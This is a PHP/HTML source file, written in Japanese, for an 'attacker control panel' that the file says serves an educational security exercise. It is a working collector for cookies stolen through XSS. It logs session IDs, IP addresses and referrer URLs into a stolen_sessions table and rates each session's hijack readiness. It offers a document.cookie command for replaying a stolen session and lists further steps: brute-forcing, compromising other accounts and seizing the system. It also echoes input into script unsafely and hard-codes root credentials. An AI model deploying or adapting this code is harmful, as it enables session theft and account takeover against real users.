<?php
session_start();
$host = 'db';
$dbname = 'security_exercise';
$username = 'root';
$password = 'password';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("データベース接続エラー: " . $e->getMessage());
}


if (isset($_GET['cookie'])) {
    $cookieData = $_GET['cookie'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? '';
    $referrer = $_GET['url'] ?? '';
    

    preg_match('/PHPSESSID=([^;]+)/', $cookieData, $matches);
    $sessionId = $matches[1] ?? '';
    
    $stmt = $pdo->prepare("INSERT INTO stolen_sessions (session_data, user_agent, ip_address, created_at) VALUES (?, ?, ?, NOW())");
    $stmt->execute([$cookieData . '|SESSIONID:' . $sessionId . '|REFERRER:' . $referrer, $userAgent, $ipAddress]);
    

    if ($sessionId) {
        echo "<script>console.log('セッション取得成功: " . $sessionId . "');</script>";
    }
}


$stmt = $pdo->prepare("SELECT * FROM stolen_sessions ORDER BY created_at DESC");
$stmt->execute();
$stolenSessions = $stmt->fetchAll();


$xssPayload = $_GET['xss'] ?? '';


function analyzeSession($sessionData) {
    $analysis = [
        'session_id' => '',
        'estimated_user' => 'unknown',
        'estimated_role' => 'unknown',
        'hijack_ready' => false
    ];
    

    if (preg_match('/PHPSESSID=([^;|]+)/', $sessionData, $matches)) {
        $analysis['session_id'] = $matches[1];
        $analysis['hijack_ready'] = true;
    }
    

    if (strpos($sessionData, 'admin') !== false || strpos($sessionData, 'dashboard') !== false) {
        $analysis['estimated_role'] = 'admin';
        $analysis['estimated_user'] = 'admin';
    } else {
        $analysis['estimated_role'] = 'user';
        $analysis['estimated_user'] = 'user1';
    }
    
    return $analysis;
}
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>攻撃者制御サイト - セッションハイジャック</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #1a1a1a; 
            color: #00ff00; 
            line-height: 1.6; 
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { 
            background: linear-gradient(45deg, #ff0000, #ff6600); 
            color: white; 
            padding: 20px; 
            text-align: center; 
            margin-bottom: 30px; 
            border-radius: 10px;
        }
        .attack-panel { 
            background: #2a2a2a; 
            border: 2px solid #ff0000; 
            border-radius: 10px; 
            padding: 20px; 
            margin-bottom: 30px; 
        }
        .attack-title { 
            color: #ff0000; 
            font-size: 1.5rem; 
            margin-bottom: 15px; 
            text-shadow: 0 0 10px #ff0000;
        }
        .session-item { 
            background: #333; 
            border-left: 4px solid #00ff00; 
            padding: 15px; 
            margin-bottom: 15px; 
            border-radius: 5px;
        }
        .session-item.admin { border-left-color: #ff0000; }
        .session-meta { 
            color: #ffff00; 
            font-size: 0.9em; 
            margin-bottom: 10px; 
        }
        .session-data { 
            color: #00ffff; 
            font-family: monospace; 
            word-break: break-all; 
        }
        .payload-box { 
            background: #0a0a0a; 
            border: 1px solid #666; 
            padding: 15px; 
            border-radius: 5px; 
            margin: 15px 0;
        }
        .btn { 
            background: #ff0000; 
            color: white; 
            padding: 10px 20px; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            margin: 5px; 
            transition: background 0.3s;
        }
        .btn:hover { background: #cc0000; }
        .btn-success { background: #00aa00; }
        .btn-success:hover { background: #008800; }
        .success { color: #00ff00; font-weight: bold; }
        .warning { color: #ffff00; font-weight: bold; }
        .danger { color: #ff0000; font-weight: bold; }
        .admin-session { color: #ff0000; font-weight: bold; }
        .code { 
            background: #000; 
            color: #00ff00; 
            padding: 10px; 
            border-radius: 3px; 
            font-family: monospace; 
            overflow-x: auto;
        }
        .blink { animation: blink 1s infinite; }
        @keyframes blink { 
            0%, 50% { opacity: 1; } 
            51%, 100% { opacity: 0.5; } 
        }
        .hijack-panel { 
            background: #4a0a0a; 
            border: 2px solid #ff4444; 
            border-radius: 10px; 
            padding: 20px; 
            margin: 20px 0;
        }
        .session-analysis { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 15px; 
            margin: 15px 0;
        }
        .analysis-item { 
            background: #1a1a1a; 
            padding: 10px; 
            border-radius: 5px; 
            border: 1px solid #333;
        }
        .exploit-instructions { 
            background: #0a2a0a; 
            padding: 20px; 
            border-radius: 10px; 
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>攻撃者制御パネル</h1>
            <p>セキュリティ演習</p>
            <div class="blink" style="margin-top: 10px;">
                <span class="success">● ACTIVE</span> | 
                <span class="warning">監視中のセッション: <?php echo count($stolenSessions); ?> 個</span>
            </div>
        </div>

        


        <div class="attack-panel">
            <h2 class="attack-title">結果</h2>
            <?php if (empty($stolenSessions)): ?>
                <div class="warning" style="margin-bottom: 20px;">
                    まだ情報は取得されていません。
                </div>
            <?php else: ?>
                <div class="success" style="margin-bottom: 20px; font-size: 1.2rem;">
                    セッション取得成功！ <?php echo count($stolenSessions); ?> 件のセッション情報を獲得
                </div>
                
                <?php foreach ($stolenSessions as $index => $session): ?>
                    <?php $analysis = analyzeSession($session['session_data']); ?>
                    <div class="session-item <?php echo $analysis['estimated_role'] === 'admin' ? 'admin' : ''; ?>">
                        <div class="session-meta">
                            <strong>取得 #<?php echo $index + 1; ?>:</strong> <?php echo $session['created_at']; ?> | 
                            <strong>IP:</strong> <?php echo htmlspecialchars($session['ip_address']); ?> |
                            <span class="<?php echo $analysis['estimated_role'] === 'admin' ? 'admin-session' : ''; ?>">
                                推定権限: <?php echo strtoupper($analysis['estimated_role']); ?>
                            </span>
                        </div>
                        
                        <div class="session-analysis">
                            <div class="analysis-item">
                                <strong>セッションID:</strong><br>
                                <code style="color: #00ffff;"><?php echo htmlspecialchars(substr($analysis['session_id'], 0, 20)); ?>...</code>
                            </div>
                            <div class="analysis-item">
                                <strong>推定ユーザー:</strong><br>
                                <code style="color: #ffff00;"><?php echo $analysis['estimated_user']; ?></code>
                            </div>
                            <div class="analysis-item">
                                <strong>ハイジャック可能:</strong><br>
                                <code style="color: <?php echo $analysis['hijack_ready'] ? '#00ff00' : '#ff0000'; ?>;">
                                    <?php echo $analysis['hijack_ready'] ? 'YES' : 'NO'; ?>
                                </code>
                            </div>
                        </div>
                        
                        <div class="session-data" style="margin-top: 15px;">
                            <strong>生データ:</strong><br>
                            <code style="font-size: 0.8em;"><?php echo htmlspecialchars($session['session_data']); ?></code>
                        </div>
                        
                        
                    </div>
                <?php endforeach; ?>
                
                <div class="exploit-instructions">
                    <h3 style="color: #00ff00;">次のステップ:</h3>
                    <ol style="margin-left: 20px; line-height: 2; margin-top: 10px;">
                        <li>上記の手順でadmin権限を取得</li>
                        <li>bruteforce.phpをアップロードして総当たり攻撃機能を有効化</li>
                        <li>他のユーザーアカウントを侵害</li>
                        <li>システム全体を掌握</li>
                    </ol>
                </div>
            <?php endif; ?>
        </div>


        <div class="attack-panel">
            <h2 class="attack-title">攻撃統計</h2>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
                <div style="background: #1a3a1a; padding: 15px; border-radius: 5px;">
                    <h3 style="color: #00ff00;">取得セッション数</h3>
                    <div style="font-size: 2rem; font-weight: bold;"><?php echo count($stolenSessions); ?></div>
                </div>
                <div style="background: #3a1a1a; padding: 15px; border-radius: 5px;">
                    <h3 style="color: #ffff00;">Admin セッション</h3>
                    <div style="font-size: 2rem; font-weight: bold; color: #ff0000;">
                        <?php 
                        $adminCount = 0;
                        foreach($stolenSessions as $s) {
                            if(analyzeSession($s['session_data'])['estimated_role'] === 'admin') $adminCount++;
                        }
                        echo $adminCount;
                        ?>
                    </div>
                </div>
                <div style="background: #1a1a3a; padding: 15px; border-radius: 5px;">
                    <h3 style="color: #00ffff;">攻撃成功率</h3>
                    <div style="font-size: 2rem; font-weight: bold; color: #00ff00;">
                        <?php echo count($stolenSessions) > 0 ? '100%' : '0%'; ?>
                    </div>
                </div>
            </div>
        </div>


        <div class="attack-panel">
            <h2 class="attack-title">リアルタイム攻撃ログ</h2>
            <div id="attack-log" style="background: #000; color: #00ff00; padding: 15px; border-radius: 5px; height: 250px; overflow-y: auto; font-family: monospace;">
                <?php if (isset($_GET['cookie'])): ?>
                    <div style="color: #ff0000; font-weight: bold;">[<?php echo date('H:i:s'); ?>] 🚨 SESSION HIJACKED!</div>
                    <div style="color: #00ff00;">[<?php echo date('H:i:s'); ?>] 新しいセッションを取得しました</div>
                    <div style="color: #ffff00;">[<?php echo date('H:i:s'); ?>] Cookie: <?php echo htmlspecialchars(substr($_GET['cookie'], 0, 50)); ?>...</div>
                    <div style="color: #00ffff;">[<?php echo date('H:i:s'); ?>] URL: <?php echo htmlspecialchars($_GET['url'] ?? 'unknown'); ?></div>
                    <div style="color: #ff4444;">[<?php echo date('H:i:s'); ?>] 🎯 攻撃成功 - セッションハイジャック完了!</div>
                <?php endif; ?>
                <div style="color: #666;">[<?php echo date('H:i:s'); ?>] 攻撃者サイト起動中...</div>
                <div style="color: #666;">[<?php echo date('H:i:s'); ?>] XSSペイロード待機中...</div>
                <div style="color: #666;">[<?php echo date('H:i:s'); ?>] セッション監視アクティブ</div>
                <div style="color: #666;">[<?php echo date('H:i:s'); ?>] ポート 8080 でリスニング中</div>
            </div>
        </div>


        <div style="background: #2a2a2a; padding: 20px; text-align: center; border-radius: 10px; margin-top: 30px;">
            <p style="color: #666;">⚠️ このサイトは教育目的のセキュリティ演習用です ⚠️</p>
            <p style="color: #666; margin-top: 10px;">
                攻撃者サイト (ポート: 8080) | 
                現在時刻: <?php echo date('Y-m-d H:i:s'); ?> | 
                監視状態: <span style="color: #00ff00;">ACTIVE</span>
            </p>
        </div>
    </div>

    <script>

        function copyToClipboard(text) {
            navigator.clipboard.writeText('document.cookie = "' + text + '"').then(function() {
                alert('Cookieコマンドをクリップボードにコピーしました！\nブラウザのConsoleに貼り付けて実行してください。');
            }).catch(function(err) {
                console.error('コピーに失敗しました: ', err);
                alert('コピーに失敗しました。手動でコピーしてください:\ndocument.cookie = "' + text + '"');
            });
        }
        

        function scrollLog() {
            const log = document.getElementById('attack-log');
            if (log) {
                log.scrollTop = log.scrollHeight;
            }
        }
        

        window.onload = function() {
            scrollLog();
        };


        <?php if (isset($_GET['cookie'])): ?>
        console.log('%c🚨 セッション取得成功！', 'color: #ff0000; font-size: 16px; font-weight: bold;');
        console.log('%c取得したCookie: <?php echo addslashes($_GET['cookie']); ?>', 'color: #00ff00;');
        

        document.body.style.animation = 'blink 0.5s 3';
        setTimeout(() => {
            document.body.style.animation = '';
        }, 1500);
        <?php endif; ?>


        setTimeout(function() {
            window.location.reload();
        }, 15000);

        console.log('%c攻撃者制御サイト起動完了', 'color: #00ff00; font-size: 14px;');
        console.log('セッション監視中: http://localhost:8080');
    </script>
</body>
</html>